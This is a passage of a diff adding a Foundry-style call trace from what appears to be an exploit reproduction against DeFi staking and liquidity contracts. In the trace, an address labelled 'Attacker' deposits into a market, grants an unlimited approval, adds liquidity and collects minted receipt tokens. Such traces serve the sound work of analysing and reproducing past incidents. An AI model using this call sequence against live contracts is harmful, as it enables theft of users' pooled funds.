+    │   │   │   │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000006010676bc2534652ad1ef5fa8073dcf9ad7ebfbe
+    │   │   │   │   │   │   │   │   │   │        topic 3: 0x000000000000000000000000e1b4d34e8754600962cd944b535180bd758e6c2e
+    │   │   │   │   │   │   │   │   │   │           data: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000004b327fef63045cccaf0000000000000000000000000000000000000000000000169448decbe633346a00000000000000000000000000000000000000000000001122d4a6c5d9d28321000000000000000000000000000000000000000000000010c53431da38e02b0800000000000000000000000000000000000000000000004b327fef63045cccaf
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 416513404704868480106 [4.165e20], 316104463514107806497 [3.161e20], 309357942716940430088 [3.093e20], 1387144695760709012655 [1.387e21]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 416513404704868480106 [4.165e20], 316104463514107806497 [3.161e20], 309357942716940430088 [3.093e20], 1387144695760709012655 [1.387e21]
+    │   │   │   │   │   │   │   ├─ [727] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 416513404704868480106 [4.165e20]
+    │   │   │   │   │   │   │   ├─ [24363] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::approve(0x6E799758CEE75DAe3d84e09D40dc416eCf713652, 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   │   ├─ emit Approval(owner: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, value: 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [218260] 0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4::depositMarket(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   │   ├─ [217462] 0x79D4E26484C6a16531C8c90F8B22af99FeA83ce3::depositMarket(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 416513404704868480106 [4.165e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [209205] 0x6E799758CEE75DAe3d84e09D40dc416eCf713652::depositMarket(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   │   │   │   ├─ [208395] 0xFF51c6b493c1E4Df4e491865352353EAdff0f9f8::depositMarket(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 416513404704868480106 [4.165e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [37796] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::transferFrom(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, value: 0)
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1102] 0xb1B9150f2085f6a553b547099977181CA802752A::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, value: 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2859] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3292] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(0x6E799758CEE75DAe3d84e09D40dc416eCf713652)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000a650808e0e24a2ec4de6d
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [148187] 0xd3b6650DE413184C7b3721c8898E4673395417d2::mint(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [66688] 0x16296859C15289731521F199F0a5f762dF6347d0::beforeReceiptTokenTransfer(0x0000000000000000000000000000000000000000, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [65884] 0x8E1aAB7E4127E70E3d3cd1E3D4788E3A31Ff78A9::beforeReceiptTokenTransfer(0x0000000000000000000000000000000000000000, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 416513404704868480106 [4.165e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit UpdatePool(param0: 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, param1: 1725388499 [1.725e9], param2: 1906315105647002133854 [1.906e21], param3: 0)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [36081] 0x2Da0CdA6f3Ca37eBCba864975278730C0539DA61::updateFor(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2540] 0xd3b6650DE413184C7b3721c8898E4673395417d2::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [50486] 0x16296859C15289731521F199F0a5f762dF6347d0::afterReceiptTokenTransfer(0x0000000000000000000000000000000000000000, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [49682] 0x8E1aAB7E4127E70E3d3cd1E3D4788E3A31Ff78A9::afterReceiptTokenTransfer(0x0000000000000000000000000000000000000000, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 416513404704868480106 [4.165e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit NewMarketDeposit(param0: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, param2: 416513404704868480106 [4.165e20], param3: 0xd3b6650DE413184C7b3721c8898E4673395417d2, param4: 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   │   │   │   ├─ emit NewDeposit(param0: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, param2: 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   │   ├─ [25524] 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0::approve(0x888888888889758F76e7103c6CbF23ABbF58F946, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   │   │   │   ├─ [24702] 0x4796D939B22027c2876d5CE9fDe52da9EC4e2362::approve(0x888888888889758F76e7103c6CbF23ABbF58F946, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x888888888889758F76e7103c6CbF23ABbF58F946, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [1461] 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [642] 0x4796D939B22027c2876d5CE9fDe52da9EC4e2362::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 906345923203725548764 [9.063e20]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 906345923203725548764 [9.063e20]
+    │   │   │   │   │   │   │   ├─ [383812] 0x888888888889758F76e7103c6CbF23ABbF58F946::addLiquiditySingleTokenKeepYt(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, 1, 1, TokenInput({ tokenIn: 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0, netTokenIn: 906345923203725548764 [9.063e20], tokenMintSy: 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0, pendleSwap: 0x0000000000000000000000000000000000000000, swapData: SwapData({ swapType: 0, extRouter: 0x0000000000000000000000000000000000000000, extCalldata: 0x, needScale: false }) }))
+    │   │   │   │   │   │   │   │   ├─ [383321] 0xb7631b93189900745Db51d960Ba64b8E6C658843::addLiquiditySingleTokenKeepYt(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, 1, 1, TokenInput({ tokenIn: 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0, netTokenIn: 906345923203725548764 [9.063e20], tokenMintSy: 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0, pendleSwap: 0x0000000000000000000000000000000000000000, swapData: SwapData({ swapType: 0, extRouter: 0x0000000000000000000000000000000000000000, extCalldata: 0x, needScale: false }) })) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [422] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::readTokens() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000007786729eee8b9d30fe7d91fdff23a0f1d0c615d9000000000000000000000000f0574d8b9dc3a9de768eaa7dbb7bb0c68521b148000000000000000000000000d66b560f4e3e85f22c192d91da847886d5c5fd00
+    │   │   │   │   │   │   │   │   │   ├─ [26343] 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0::transferFrom(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x888888888889758F76e7103c6CbF23ABbF58F946, 906345923203725548764 [9.063e20])
+    │   │   │   │   │   │   │   │   │   │   ├─ [25515] 0x4796D939B22027c2876d5CE9fDe52da9EC4e2362::transferFrom(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x888888888889758F76e7103c6CbF23ABbF58F946, 906345923203725548764 [9.063e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x888888888889758F76e7103c6CbF23ABbF58F946, value: 906345923203725548764 [9.063e20])
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   ├─ [3641] 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0::allowance(0x888888888889758F76e7103c6CbF23ABbF58F946, 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [2819] 0x4796D939B22027c2876d5CE9fDe52da9EC4e2362::allowance(0x888888888889758F76e7103c6CbF23ABbF58F946, 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    │   │   │   │   │   │   │   │   │   ├─ [45117] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::deposit(0x888888888889758F76e7103c6CbF23ABbF58F946, 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0, 906345923203725548764 [9.063e20], 1)
+    │   │   │   │   │   │   │   │   │   │   ├─ [9243] 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0::transferFrom(0x888888888889758F76e7103c6CbF23ABbF58F946, 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9, 906345923203725548764 [9.063e20])
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [8415] 0x4796D939B22027c2876d5CE9fDe52da9EC4e2362::transferFrom(0x888888888889758F76e7103c6CbF23ABbF58F946, 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9, 906345923203725548764 [9.063e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x888888888889758F76e7103c6CbF23ABbF58F946, to: 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9, value: 906345923203725548764 [9.063e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x888888888889758F76e7103c6CbF23ABbF58F946, value: 906345923203725548764 [9.063e20])
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Deposit(param0: 0x888888888889758F76e7103c6CbF23ABbF58F946, param1: 0x888888888889758F76e7103c6CbF23ABbF58F946, param2: 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0, param3: 906345923203725548764 [9.063e20], param4: 906345923203725548764 [9.063e20])
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000003122138f2095885cdc
+    │   │   │   │   │   │   │   │   │   ├─ [13084] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::readState(0x888888888889758F76e7103c6CbF23ABbF58F946) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [4876] 0x1A6fCc85557BC4fB7B534ed835a03EF056552D52::getMarketConfig(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, 0x888888888889758F76e7103c6CbF23ABbF58F946) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000008270400d528c34e1596ef367eedec99080a1b59200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000050
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000897835faa58e6ed4cc0000000000000000000000000000000000000000000001214795b8637da0767d0000000000000000000000000000000000000000000000d6c175407e7e4fad450000000000000000000000008270400d528c34e1596ef367eedec99080a1b592000000000000000000000000000000000000000000000000f20879a8d3600e000000000000000000000000000000000000000000000000000000000066f4a40000000000000000000000000000000000000000000000000000038d0a4e4d2540000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000001812fcba867af69
+    │   │   │   │   │   │   │   │   │   ├─ [16492] 0xD66b560f4e3e85f22C192d91dA847886d5C5Fd00::pyIndexCurrent()
+    │   │   │   │   │   │   │   │   │   │   ├─ [4127] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::exchangeRate() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [3313] 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0::getRate() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2497] 0x4796D939B22027c2876d5CE9fDe52da9EC4e2362::getRate() [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000e1f40c47b30f9af
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000e1f40c47b30f9af
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1017603253433596335 [1.017e18]
+    │   │   │   │   │   │   │   │   │   │   ├─ emit NewInterestIndex(param0: 1017603253433596335 [1.017e18])
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000e1f40c47b30f9af
+    │   │   │   │   │   │   │   │   │   ├─ [8858] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::transfer(0xD66b560f4e3e85f22C192d91dA847886d5C5Fd00, 288520204451785050566 [2.885e20])
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x888888888889758F76e7103c6CbF23ABbF58F946, to: 0xD66b560f4e3e85f22C192d91dA847886d5C5Fd00, value: 288520204451785050566 [2.885e20])
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   ├─ [8858] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::transfer(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, 617825718751940498198 [6.178e20])
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x888888888889758F76e7103c6CbF23ABbF58F946, to: 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, value: 617825718751940498198 [6.178e20])
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   ├─ [85022] 0xD66b560f4e3e85f22C192d91dA847886d5C5Fd00::mintPY(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   │   │   │   │   ├─ [753] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::balanceOf(0xD66b560f4e3e85f22C192d91dA847886d5C5Fd00) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5258737723115498896019 [5.258e21]
+    │   │   │   │   │   │   │   │   │   │   ├─ [1036] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   │   │   │   │   ├─ [1197] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::rewardIndexesCurrent()
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 293599098731462852336 [2.935e20])
+    │   │   │   │   │   │   │   │   │   │   ├─ [14463] 0xF0574d8B9Dc3a9DE768eaa7DBB7bB0C68521b148::mintByYT(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, 293599098731462852336 [2.935e20])
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, value: 293599098731462852336 [2.935e20])
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Mint(param0: 0x888888888889758F76e7103c6CbF23ABbF58F946, param1: 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, param2: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param3: 288520204451785050566 [2.885e20], param4: 293599098731462852336 [2.935e20])
+    │   │   │   │   │   │   │   │   │   │   ├─ [753] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::balanceOf(0xD66b560f4e3e85f22C192d91dA847886d5C5Fd00) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5258737723115498896019 [5.258e21]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 293599098731462852336 [2.935e20]
+    │   │   │   │   │   │   │   │   │   ├─ [158143] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::mint(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 617825718751940498198 [6.178e20], 293599098731462852336 [2.935e20])
+    │   │   │   │   │   │   │   │   │   │   ├─ [876] 0x1A6fCc85557BC4fB7B534ed835a03EF056552D52::getMarketConfig(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, 0x888888888889758F76e7103c6CbF23ABbF58F946) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000008270400d528c34e1596ef367eedec99080a1b59200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000050
+    │   │   │   │   │   │   │   │   │   │   ├─ [1060] 0xD66b560f4e3e85f22C192d91dA847886d5C5Fd00::pyIndexCurrent()
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000e1f40c47b30f9af
+    │   │   │   │   │   │   │   │   │   │   ├─ [1036] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   │   │   │   │   ├─ [1238] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::claimRewards(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6)
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   │   │   │   │   ├─ [27384] 0x47D74516B33eD5D70ddE7119A40839f6Fcc24e57::redeemMarketReward()
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [27004] 0x7762CbfA8f62999A8A40D800b751686e99A31C9a::redeemMarketReward() [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [10793] 0x808507121B80c02388fAd14726482e061B8da827::transfer(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, 12046378491247257936 [1.204e19])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x47D74516B33eD5D70ddE7119A40839f6Fcc24e57, to: 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, value: 12046378491247257936 [1.204e19])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit MarketClaimReward(param0: 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, param1: 12046378491247257936 [1.204e19])
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   │   │   │   │   ├─ [610] 0x808507121B80c02388fAd14726482e061B8da827::balanceOf(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 9767678611765020327217 [9.767e21]
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   │   │   │   ├─ [2859] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   ├─ [9051] 0xC6378a93725E499a20DF8F00aE31D9ce9D09F1CA::4af74b68(000000000000000000000000000000000000000000000000000000000000000f00000000000000000000000000000000000000000000000000000000000000db0000000000000000000000000000000000000000000000000000000066d756d300000000000000000000000000000000000000000000000001812fcba867af6900000000000000000000000000000000000000000000000000000000000001490000000000000000000000000000000000000000000000000000000000000149) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000dc0000000000000000000000000000000000000000000000000000000000000149
+    │   │   │   │   │   │   │   │   │   │   ├─  emit topic 0: 0x5c0e21d57bb4cf91d8fe238d6f92e2685a695371b19209afcce6217b478f83e1
+    │   │   │   │   │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000066d756d3
+    │   │   │   │   │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000001812fcba867af69
+    │   │   │   │   │   │   │   │   │   │   ├─ [753] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::balanceOf(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5954093003314330282294 [5.954e21]
+    │   │   │   │   │   │   │   │   │   │   ├─ [577] 0xF0574d8B9Dc3a9DE768eaa7DBB7bB0C68521b148::balanceOf(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 2829465392451590859578 [2.829e21]
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Mint(param0: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 458662065591341047289 [4.586e20], param2: 617825718751940498194 [6.178e20], param3: 293599098731462852336 [2.935e20])
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 458662065591341047289 [4.586e20], 617825718751940498194 [6.178e20], 293599098731462852336 [2.935e20]
+    │   │   │   │   │   │   │   │   │   ├─  emit topic 0: 0xa9b749795680682fbc5a34071e19282bbb23496a8cf9bbd99bf941359bbe65bf
+    │   │   │   │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000038c1b03dab3b891afbca4371ec807edaa3e6eb6
+    │   │   │   │   │   │   │   │   │   │        topic 3: 0x000000000000000000000000fae103dc9cf190ed75350761e95403b7b8afa6c0
+    │   │   │   │   │   │   │   │   │   │           data: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000003122138f2095885cdc000000000000000000000000000000000000000000000018dd36fe8f3ecc5df900000000000000000000000000000000000000000000000fea8188bdd7aefef000000000000000000000000000000000000000000000000fa405ad4da7b989c600000000000000000000000000000000000000000000003122138f2095885cdc
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 458662065591341047289 [4.586e20], 293599098731462852336 [2.935e20], 288520204451785050566 [2.885e20], 906345923203725548764 [9.063e20]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 458662065591341047289 [4.586e20], 293599098731462852336 [2.935e20], 288520204451785050566 [2.885e20], 906345923203725548764 [9.063e20]
+    │   │   │   │   │   │   │   ├─ [779] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 458662065591341047289 [4.586e20]
+    │   │   │   │   │   │   │   ├─ [24393] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::approve(0x6E799758CEE75DAe3d84e09D40dc416eCf713652, 458662065591341047289 [4.586e20])
